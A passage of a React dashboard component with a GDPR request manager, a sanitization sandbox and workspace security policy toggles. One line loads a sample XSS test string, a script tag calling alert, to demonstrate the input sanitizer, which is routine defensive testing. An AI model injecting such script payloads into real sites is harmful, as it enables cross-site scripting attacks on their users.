                          <span className="font-mono text-xs text-slate-400">({req.subjectEmail})</span>
                          <span className={`text-[10px] uppercase font-bold px-2 py-0.5 rounded-full border ${
                            req.status === 'completed'
                              ? 'bg-emerald-950/80 text-emerald-400 border-emerald-800/40'
                              : req.status === 'rejected'
                              ? 'bg-rose-950/80 text-rose-400 border-rose-800/40'
                              : 'bg-amber-950/80 text-amber-400 border-amber-800/40'
                          }`}>
                            {req.status}
                          </span>
                        </div>
                        <p className="text-xs text-slate-400">
                          Type: <span className="text-slate-200 font-medium capitalize">{req.requestType.replace(/_/g, ' ')}</span> • Filed {new Date(req.requestedAt).toLocaleDateString()}
                        </p>
                        {req.notes && (
                          <p className="text-xs text-slate-300 italic bg-slate-950/60 p-2 rounded border border-slate-800/60 max-w-xl">
                            "{req.notes}"
                          </p>
                        )}
                        {req.anonymizedRecordsCount && (
                          <p className="text-[11px] text-emerald-400 font-mono">
                            ✓ {req.anonymizedRecordsCount} records pseudonymized across database.
                          </p>
                        )}
                      </div>

                      {isPending && (
                        <div className="flex items-center gap-2 shrink-0">
                          {req.requestType === 'forget_personal_info' ? (
                            <button
                              onClick={() => processGdprRequest(req.id, 'anonymize')}
                              className="px-3 py-1.5 bg-rose-600 hover:bg-rose-500 text-white rounded text-xs font-semibold transition-colors"
                            >
                              Execute Erasure & Anonymize
                            </button>
                          ) : (
                            <button
                              onClick={() => processGdprRequest(req.id, 'approve')}
                              className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-500 text-white rounded text-xs font-semibold transition-colors"
                            >
                              Approve & Export Bundle
                            </button>
                          )}
                          <button
                            onClick={() => processGdprRequest(req.id, 'reject')}
                            className="px-2.5 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded text-xs transition-colors"
                          >
                            Reject
                          </button>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            </div>

            {/* New GDPR Request Modal */}
            {isNewGdprModalOpen && (
              <div className="fixed inset-0 bg-slate-950/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
                <div className="bg-slate-900 border border-slate-800 rounded-xl max-w-md w-full p-5 shadow-2xl space-y-4">
                  <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                    <h3 className="font-semibold text-base text-white">File Data Subject Request</h3>
                    <button onClick={() => setIsNewGdprModalOpen(false)} className="text-slate-400 hover:text-white">✕</button>
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">Subject Full Name</label>
                    <input
                      type="text"
                      placeholder="e.g. John Kamau"
                      value={gdprSubjectName}
                      onChange={(e) => setGdprSubjectName(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-md p-2 text-xs text-slate-200"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">Subject Email Address</label>
                    <input
                      type="email"
                      placeholder="e.g. john@example.com"
                      value={gdprSubjectEmail}
                      onChange={(e) => setGdprSubjectEmail(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-md p-2 text-xs text-slate-200"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">Request Type</label>
                    <select
                      value={gdprType}
                      onChange={(e) => setGdprType(e.target.value as GdprRequestType)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-md p-2 text-xs text-slate-200"
                    >
                      <option value="forget_personal_info">Right to be Forgotten (Pseudonymize Records)</option>
                      <option value="export_data">Data Portability (Export PII Bundle)</option>
                      <option value="rectify_records">Rectification of Information</option>
                    </select>
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">Context / Legal Justification</label>
                    <textarea
                      rows={3}
                      placeholder="e.g. Contract ended Q3 2026. Requested removal from agency databases."
                      value={gdprNotes}
                      onChange={(e) => setGdprNotes(e.target.value)}
                      className="w-full bg-slate-950 border border-slate-800 rounded-md p-2 text-xs text-slate-200"
                    />
                  </div>

                  <div className="flex items-center justify-end gap-2 pt-2">
                    <button
                      onClick={() => setIsNewGdprModalOpen(false)}
                      className="px-3 py-1.5 text-xs text-slate-400 hover:text-white"
                    >
                      Cancel
                    </button>
                    <button
                      onClick={() => {
                        if (!gdprSubjectName.trim() || !gdprSubjectEmail.trim()) return;
                        submitGdprRequest(gdprSubjectName.trim(), gdprSubjectEmail.trim(), gdprType, gdprNotes.trim());
                        setIsNewGdprModalOpen(false);
                        setGdprSubjectName('');
                        setGdprSubjectEmail('');
                        setGdprNotes('');
                      }}
                      className="px-4 py-1.5 bg-indigo-600 hover:bg-indigo-500 text-white rounded text-xs font-semibold"
                    >
                      Submit Privacy Request
                    </button>
                  </div>
                </div>
              </div>
            )}
          </div>
        )}

        {/* Tab 4: Threat Sandbox & Input Sanitizer */}
        {activeTab === 'sandbox' && (
          <div className="space-y-6">
            <div>
              <h2 className="text-base font-semibold text-white">Live Threat Sandbox & Sanitization Engine</h2>
              <p className="text-xs text-slate-400">
                Test input sanitization, cross-site scripting (XSS) neutralizers, and automated M-Pesa / PII data redactors.
              </p>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
              {/* Left Column: Interactive Input Tester */}
              <div className="space-y-4 bg-slate-900/50 p-5 rounded-xl border border-slate-800">
                <div className="flex items-center justify-between">
                  <h3 className="font-semibold text-sm text-white flex items-center gap-2">
                    <Terminal className="w-4 h-4 text-emerald-400" />
                    Input Injection & Masking Sandbox
                  </h3>
                  <button
                    onClick={() =>
                      setSandboxInput(
                        "<script>alert('pwned')</script> Contact Brian at +254 712 345 678 with transaction code SVD9011J2."
                      )
                    }
                    className="text-xs text-emerald-400 hover:underline"
                  >
                    Load Sample Vector
                  </button>
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">Untrusted Raw Input String</label>
                  <textarea
                    rows={4}
                    value={sandboxInput}
                    onChange={(e) => setSandboxInput(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-md p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-emerald-500/50"
                  />
                </div>

                <div className="space-y-3">
                  <div>
                    <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">
                      Sanitized Clean Output (XSS Stripped):
                    </span>
                    <div className="bg-slate-950 p-3 rounded-md border border-slate-800 text-xs font-mono text-emerald-300 mt-1 break-all">
                      {sanitizeInputText(sandboxInput)}
                    </div>
                  </div>

                  <div>
                    <span className="text-[11px] font-semibold text-slate-400 uppercase tracking-wider">
                      Automated PII & M-Pesa Redaction:
                    </span>
                    <div className="bg-slate-950 p-3 rounded-md border border-slate-800 text-xs font-mono text-sky-300 mt-1 break-all">
                      {maskSensitiveData(sandboxInput)}
                    </div>
                  </div>
                </div>
              </div>

              {/* Right Column: Global Security Policies */}
              <div className="space-y-4 bg-slate-900/50 p-5 rounded-xl border border-slate-800">
                <h3 className="font-semibold text-sm text-white flex items-center gap-2">
                  <Sliders className="w-4 h-4 text-sky-400" />
                  Workspace Security Policies
                </h3>

                <div className="space-y-3 text-xs">
                  <div className="flex items-center justify-between p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <div>
                      <p className="font-medium text-white">Require 2-Factor Authentication (2FA)</p>
                      <p className="text-slate-400 text-[11px]">Enforce hardware TOTP for all agency workspace staff</p>
                    </div>
                    <button
                      onClick={() => updateSecurityPolicy({ twoFactorRequired: !securityPolicy.twoFactorRequired })}
                      className={`w-11 h-6 rounded-full transition-colors relative ${
                        securityPolicy.twoFactorRequired ? 'bg-emerald-600' : 'bg-slate-800'
                      }`}
                    >
                      <span className={`w-4 h-4 rounded-full bg-white absolute top-1 transition-transform ${
                        securityPolicy.twoFactorRequired ? 'left-6' : 'left-1'
                      }`} />
                    </button>
                  </div>

                  <div className="flex items-center justify-between p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <div>
                      <p className="font-medium text-white">Strict XSS & HTML Neutralization</p>
                      <p className="text-slate-400 text-[11px]">Strip executable code from client comments & notes</p>
                    </div>
                    <button
                      onClick={() => updateSecurityPolicy({ strictXssSanitization: !securityPolicy.strictXssSanitization })}
                      className={`w-11 h-6 rounded-full transition-colors relative ${
                        securityPolicy.strictXssSanitization ? 'bg-emerald-600' : 'bg-slate-800'
                      }`}
                    >
                      <span className={`w-4 h-4 rounded-full bg-white absolute top-1 transition-transform ${
                        securityPolicy.strictXssSanitization ? 'left-6' : 'left-1'
                      }`} />
                    </button>
                  </div>

                  <div className="flex items-center justify-between p-3 rounded-lg bg-slate-950 border border-slate-800">
                    <div>
                      <p className="font-medium text-white">Auto-Mask M-Pesa & Phone Numbers</p>
                      <p className="text-slate-400 text-[11px]">Redact sensitive financial receipts from shared views</p>
                    </div>
                    <button
                      onClick={() => updateSecurityPolicy({ sensitiveMaskingEnabled: !securityPolicy.sensitiveMaskingEnabled })}
                      className={`w-11 h-6 rounded-full transition-colors relative ${
                        securityPolicy.sensitiveMaskingEnabled ? 'bg-emerald-600' : 'bg-slate-800'
                      }`}
                    >
                      <span className={`w-4 h-4 rounded-full bg-white absolute top-1 transition-transform ${
                        securityPolicy.sensitiveMaskingEnabled ? 'left-6' : 'left-1'
                      }`} />
                    </button>
                  </div>

                  {/* Trusted IP Allowlist */}
                  <div className="p-3 rounded-lg bg-slate-950 border border-slate-800 space-y-2">
                    <p className="font-medium text-white">Trusted Corporate IP CIDR Allowlist</p>
                    <div className="flex items-center gap-2">
                      <input
                        type="text"
                        placeholder="e.g. 197.232.14.0/24"
                        value={newIpInput}
                        onChange={(e) => setNewIpInput(e.target.value)}
                        className="bg-slate-900 border border-slate-800 rounded px-2.5 py-1 text-xs text-slate-200 flex-1 font-mono"
                      />
                      <button
                        onClick={handleAddIp}
                        className="px-3 py-1 bg-slate-800 hover:bg-slate-700 text-white rounded text-xs font-medium"
                      >
                        Add CIDR
                      </button>
                    </div>

                    <div className="flex flex-wrap gap-1.5 pt-1">
                      {securityPolicy.ipAllowlist.map(ip => (
                        <span key={ip} className="font-mono text-[11px] bg-slate-900 border border-slate-800 px-2 py-0.5 rounded flex items-center gap-1.5 text-slate-300">
                          {ip}
                          <button onClick={() => handleRemoveIp(ip)} className="text-slate-500 hover:text-rose-400">×</button>
                        </span>
                      ))}
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
